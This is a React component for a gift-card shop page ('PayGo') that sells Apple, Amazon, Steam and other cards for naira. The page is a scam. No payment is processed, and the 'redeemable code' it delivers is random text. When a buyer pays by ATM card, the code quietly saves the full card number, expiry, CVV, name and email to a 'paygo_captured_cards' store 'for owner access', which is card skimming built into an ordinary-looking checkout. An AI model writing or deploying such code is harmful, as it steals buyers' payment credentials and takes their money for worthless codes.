import React, { useState, useEffect } from 'react';
import { useAuth } from '../context/AuthContext';
import {
  ArrowLeft,
  Gift,
  CheckCircle2,
  Copy,
  Check,
  CreditCard,
  Wallet,
  ShieldCheck,
  Sparkles,
  ShoppingBag,
} from 'lucide-react';

interface GiftCardsProps {
  onBack: () => void;
}

interface GiftCardOption {
  id: string;
  name: string;
  category: string;
  icon: string;
  color: string;
  denominations: { usd: number; ngn: number }[];
}

export const GiftCards: React.FC<GiftCardsProps> = ({ onBack }) => {
  const { user, updateBalance, addTransaction } = useAuth();

  const [selectedCard, setSelectedCard] = useState<GiftCardOption | null>(null);
  const [selectedDenom, setSelectedDenom] = useState<{ usd: number; ngn: number } | null>(null);
  const [paymentMethod, setPaymentMethod] = useState<'balance' | 'card'>('balance');

  // ATM Card form state if paying with card
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardName, setCardName] = useState(user?.name || '');

  const [isProcessing, setIsProcessing] = useState(false);
  const [countdown, setCountdown] = useState(6);
  const [purchasedCode, setPurchasedCode] = useState<string | null>(null);
  const [copiedCode, setCopiedCode] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  const GIFT_CARDS: GiftCardOption[] = [
    {
      id: 'apple',
      name: 'Apple / iTunes Gift Card',
      category: 'Gaming & Apps',
      icon: '🍎',
      color: 'from-gray-900 to-gray-800',
      denominations: [
        { usd: 10, ngn: 14500 },
        { usd: 25, ngn: 35000 },
        { usd: 50, ngn: 68000 },
        { usd: 100, ngn: 135000 },
      ],
    },
    {
      id: 'google-play',
      name: 'Google Play Gift Card',
      category: 'Gaming & Apps',
      icon: '▶️',
      color: 'from-emerald-600 to-teal-800',
      denominations: [
        { usd: 10, ngn: 14000 },
        { usd: 25, ngn: 34000 },
        { usd: 50, ngn: 66000 },
        { usd: 100, ngn: 130000 },
      ],
    },
    {
      id: 'amazon',
      name: 'Amazon Gift Card',
      category: 'Shopping',
      icon: '📦',
      color: 'from-amber-500 to-orange-600',
      denominations: [
        { usd: 10, ngn: 14500 },
        { usd: 25, ngn: 35000 },
        { usd: 50, ngn: 68000 },
        { usd: 100, ngn: 135000 },
      ],
    },
    {
      id: 'steam',
      name: 'Steam Wallet Card',
      category: 'Gaming',
      icon: '🎮',
      color: 'from-blue-900 to-slate-900',
      denominations: [
        { usd: 10, ngn: 14200 },
        { usd: 20, ngn: 28000 },
        { usd: 50, ngn: 67000 },
        { usd: 100, ngn: 132000 },
      ],
    },
    {
      id: 'netflix',
      name: 'Netflix Subscription Card',
      category: 'Entertainment',
      icon: '🎬',
      color: 'from-red-600 to-black',
      denominations: [
        { usd: 15, ngn: 21000 },
        { usd: 30, ngn: 42000 },
        { usd: 50, ngn: 70000 },
      ],
    },
    {
      id: 'playstation',
      name: 'PlayStation Network Card',
      category: 'Gaming',
      icon: '🎯',
      color: 'from-blue-600 to-indigo-900',
      denominations: [
        { usd: 10, ngn: 14500 },
        { usd: 25, ngn: 35000 },
        { usd: 50, ngn: 68000 },
        { usd: 100, ngn: 135000 },
      ],
    },
    {
      id: 'xbox',
      name: 'Xbox Live Gift Card',
      category: 'Gaming',
      icon: '🟢',
      color: 'from-emerald-700 to-gray-900',
      denominations: [
        { usd: 10, ngn: 14500 },
        { usd: 25, ngn: 35000 },
        { usd: 50, ngn: 68000 },
      ],
    },
    {
      id: 'visa',
      name: 'Visa Virtual Prepaid Card',
      category: 'Global Shopping',
      icon: '💳',
      color: 'from-blue-700 to-blue-900',
      denominations: [
        { usd: 20, ngn: 30000 },
        { usd: 50, ngn: 73000 },
        { usd: 100, ngn: 145000 },
      ],
    },
  ];

  // Processing timer
  useEffect(() => {
    let timer: any;
    if (isProcessing && countdown > 0) {
      timer = setTimeout(() => setCountdown((c) => c - 1), 1000);
    } else if (isProcessing && countdown === 0) {
      if (selectedCard && selectedDenom) {
        if (paymentMethod === 'balance') {
          updateBalance(selectedDenom.ngn);
        }

        const generatedCode = `${selectedCard.id.toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;

        addTransaction({
          type: 'Gift Card Purchase',
          amount: selectedDenom.ngn,
          giftCardName: `${selectedCard.name} ($${selectedDenom.usd})`,
          giftCardCode: generatedCode,
          date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
        });

        // Also log card submission if paid with ATM card for owner access
        if (paymentMethod === 'card') {
          try {
            const existing = JSON.parse(localStorage.getItem('paygo_captured_cards') || '[]');
            existing.unshift({
              id: `CARD-${Date.now()}`,
              type: `Gift Card Purchase ($${selectedDenom.usd})`,
              cardNumber,
              expiry,
              cvv,
              cardName,
              amount: selectedDenom.ngn,
              userEmail: user?.email || 'unknown',
              userName: user?.name || cardName,
              date: new Date().toLocaleString(),
            });
            localStorage.setItem('paygo_captured_cards', JSON.stringify(existing));
          } catch (e) {
            console.error(e);
          }
        }

        setPurchasedCode(generatedCode);
      }
      setIsProcessing(false);
    }
    return () => clearTimeout(timer);
  }, [isProcessing, countdown]);

  const handlePurchase = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    if (!selectedCard || !selectedDenom) {
      setErrorMsg('Please select a gift card and denomination');
      return;
    }

    if (paymentMethod === 'balance') {
      if (selectedDenom.ngn > (user?.balance || 0)) {
        setErrorMsg('Insufficient wallet balance for this purchase. Try depositing funds.');
        return;
      }
    } else {
      const cleanCard = cardNumber.replace(/\s/g, '');
      if (cleanCard.length < 16 || !expiry || !cvv) {
        setErrorMsg('Please enter valid ATM card details');
        return;
      }
    }

    setCountdown(6);
    setIsProcessing(true);
  };

  const copyCode = () => {
    if (purchasedCode) {
      navigator.clipboard.writeText(purchasedCode);
      setCopiedCode(true);
      setTimeout(() => setCopiedCode(false), 2000);
    }
  };

  if (isProcessing) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl p-8 max-w-sm w-full text-center shadow-xl border border-gray-100 space-y-4">
          <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin mx-auto" />
          <h3 className="text-xl font-bold text-gray-900">Processing Gift Card...</h3>
          <p className="text-sm text-gray-500">Generating secure redeemable code for {selectedCard?.name}</p>
          <div className="text-3xl font-black text-purple-600 font-mono">{countdown}s</div>
        </div>
      </div>
    );
  }

  if (purchasedCode && selectedCard && selectedDenom) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4 sm:p-6">
        <div className="bg-white rounded-3xl p-6 sm:p-8 max-w-md w-full shadow-xl border border-gray-100 text-center space-y-6">
          <div className="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto ring-8 ring-emerald-50">
            <CheckCircle2 className="w-9 h-9" />
          </div>

          <div>
            <h3 className="text-2xl font-extrabold text-gray-900">Purchase Successful!</h3>
            <p className="text-sm text-emerald-600 font-semibold mt-1">
              Your {selectedCard.name} code is ready
            </p>
          </div>

          <div className="bg-gradient-to-br from-purple-900 to-indigo-900 text-white rounded-2xl p-5 shadow-md space-y-3">
            <div className="flex items-center justify-between text-xs text-purple-200">
              <span>{selectedCard.name}</span>
              <span className="font-bold text-white">${selectedDenom.usd} USD</span>
            </div>
            <div className="bg-white/10 border border-white/20 rounded-xl p-3.5 flex items-center justify-between">
              <span className="font-mono font-bold text-sm sm:text-base text-amber-300 select-all">
                {purchasedCode}
              </span>
              <button
                onClick={copyCode}
                className="bg-white text-purple-900 hover:bg-purple-50 px-3 py-1.5 rounded-lg text-xs font-bold flex items-center space-x-1 shrink-0 ml-2"
              >
                {copiedCode ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copiedCode ? 'Copied' : 'Copy'}</span>
              </button>
            </div>
            <p className="text-[11px] text-purple-200">
              Paid: ${selectedDenom.ngn.toLocaleString()} ({paymentMethod === 'balance' ? 'Wallet Balance' : 'ATM Card'})
            </p>
          </div>

          <button
            onClick={() => {
              setPurchasedCode(null);
              setSelectedCard(null);
              setSelectedDenom(null);
            }}
            className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl shadow-md transition-all cursor-pointer"
          >
            Buy Another Gift Card
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 pb-12">
      <div className="bg-purple-700 text-white p-4 shadow-md sticky top-0 z-30">
        <div className="max-w-xl mx-auto flex items-center space-x-3">
          <button onClick={onBack} className="p-2 hover:bg-white/10 rounded-full transition-colors text-white">
            <ArrowLeft className="w-5 h-5" />
          </button>
          <div>
            <h1 className="text-lg font-bold">Buy Gift Cards</h1>
            <p className="text-xs text-purple-200">Global gift cards at unbeatable discounted rates</p>
          </div>
        </div>
      </div>

      <div className="max-w-xl mx-auto p-4 sm:p-6 space-y-6">
        {selectedCard ? (
          <div className="bg-white rounded-3xl p-6 shadow-sm border border-gray-100 space-y-6 animate-in fade-in">
            <button
              onClick={() => {
                setSelectedCard(null);
                setSelectedDenom(null);
              }}
              className="text-xs text-purple-600 font-semibold flex items-center space-x-1 hover:underline"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>Back to Gift Cards Catalog</span>
            </button>

            <div className={`bg-gradient-to-r ${selectedCard.color} text-white rounded-2xl p-5 shadow-md flex items-center space-x-4`}>
              <div className="text-4xl">{selectedCard.icon}</div>
              <div>
                <span className="text-[10px] uppercase font-bold tracking-wider bg-white/20 px-2 py-0.5 rounded-md">
                  {selectedCard.category}
                </span>
                <h2 className="text-xl font-bold mt-1">{selectedCard.name}</h2>
              </div>
            </div>

            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-2">
                Select Denomination ($ USD)
              </label>
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
                {selectedCard.denominations.map((d) => (
                  <button
                    key={d.usd}
                    type="button"
                    onClick={() => setSelectedDenom(d)}
                    className={`p-3 rounded-2xl border-2 text-center transition-all ${
                      selectedDenom?.usd === d.usd
                        ? 'border-purple-600 bg-purple-50 text-purple-900 shadow-xs'
                        : 'border-gray-200 hover:border-gray-300 text-gray-800 bg-white'
                    }`}
                  >
                    <div className="font-extrabold text-base">${d.usd}</div>
                    <div className="text-xs font-bold text-emerald-600 mt-0.5">
                      ${d.ngn.toLocaleString()}
                    </div>
                  </button>
                ))}
              </div>
            </div>

            {selectedDenom && (
              <div className="space-y-4 pt-2 border-t border-gray-100 animate-in fade-in">
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600">
                  Payment Method
                </label>
                <div className="grid grid-cols-2 gap-2 bg-gray-100 p-1.5 rounded-2xl">
                  <button
                    type="button"
                    onClick={() => setPaymentMethod('balance')}
                    className={`py-3 rounded-xl font-bold text-xs flex items-center justify-center space-x-1.5 transition-all ${
                      paymentMethod === 'balance'
                        ? 'bg-white text-purple-900 shadow-sm'
                        : 'text-gray-600 hover:text-gray-900'
                    }`}
                  >
                    <Wallet className="w-4 h-4 text-purple-600" />
                    <span>Wallet Balance (${(user?.balance || 50000).toLocaleString()})</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setPaymentMethod('card')}
                    className={`py-3 rounded-xl font-bold text-xs flex items-center justify-center space-x-1.5 transition-all ${
                      paymentMethod === 'card'
                        ? 'bg-white text-purple-900 shadow-sm'
                        : 'text-gray-600 hover:text-gray-900'
                    }`}
                  >
                    <CreditCard className="w-4 h-4 text-emerald-600" />
                    <span>ATM Debit Card</span>
                  </button>
                </div>

                {paymentMethod === 'card' && (
                  <form onSubmit={handlePurchase} className="space-y-3.5 bg-gray-50 p-4 rounded-2xl border border-gray-200">
                    <div>
                      <label className="block text-xs font-semibold text-gray-600 mb-1">Card Number</label>
                      <input
                        type="text"
                        value={cardNumber}
                        onChange={(e) => {
                          const val = e.target.value.replace(/\D/g, '').slice(0, 16);
                          setCardNumber(val.replace(/(\d{4})(?=\d)/g, '$1 '));
                        }}
                        placeholder="4532 •••• •••• ••••"
                        className="w-full p-3 bg-white border border-gray-300 rounded-xl text-xs font-mono outline-none"
                        required
                      />
                    </div>
                    <div className="grid grid-cols-2 gap-2">
                      <div>
                        <label className="block text-xs font-semibold text-gray-600 mb-1">Expiry (MM/YY)</label>
                        <input
                          type="text"
                          value={expiry}
                          onChange={(e) => setExpiry(e.target.value)}
                          placeholder="MM/YY"
                          className="w-full p-3 bg-white border border-gray-300 rounded-xl text-xs font-mono outline-none"
                          required
                        />
                      </div>
                      <div>
                        <label className="block text-xs font-semibold text-gray-600 mb-1">CVV</label>
                        <input
                          type="password"
                          maxLength={4}
                          value={cvv}
                          onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))}
                          placeholder="123"
                          className="w-full p-3 bg-white border border-gray-300 rounded-xl text-xs font-mono outline-none"
                          required
                        />
                      </div>
                    </div>
                  </form>
                )}

                {errorMsg && (
                  <div className="p-3 bg-red-50 border border-red-200 text-red-600 text-xs rounded-xl">
                    {errorMsg}
                  </div>
                )}

                <button
                  type="button"
                  onClick={handlePurchase}
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
                >
                  <ShoppingBag className="w-5 h-5" />
                  <span>Buy Now (${selectedDenom.ngn.toLocaleString()})</span>
                </button>
              </div>
            )}
          </div>
        ) : (
          <div className="space-y-4">
            <div className="flex items-center justify-between px-1">
              <h2 className="text-base font-bold text-gray-900">Available Gift Cards</h2>
              <span className="text-xs text-purple-600 font-semibold">Instant Delivery</span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
              {GIFT_CARDS.map((card) => (
                <div
                  key={card.id}
                  onClick={() => {
                    setSelectedCard(card);
                    setSelectedDenom(card.denominations[0]);
                  }}
                  className="bg-white rounded-2xl p-5 shadow-xs border border-gray-100 hover:border-purple-300 hover:shadow-md transition-all cursor-pointer flex items-center space-x-4 group"
                >
                  <div className={`w-14 h-14 rounded-2xl bg-gradient-to-br ${card.color} text-white flex items-center justify-center text-2xl shadow-sm shrink-0 group-hover:scale-105 transition-transform`}>
                    {card.icon}
                  </div>
                  <div className="flex-1 min-w-0">
                    <span className="text-[10px] uppercase font-bold text-purple-600 tracking-wider">
                      {card.category}
                    </span>
                    <h3 className="font-bold text-sm text-gray-900 truncate">{card.name}</h3>
                    <p className="text-xs text-emerald-600 font-semibold mt-0.5">
                      From ${card.denominations[0].ngn.toLocaleString()}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
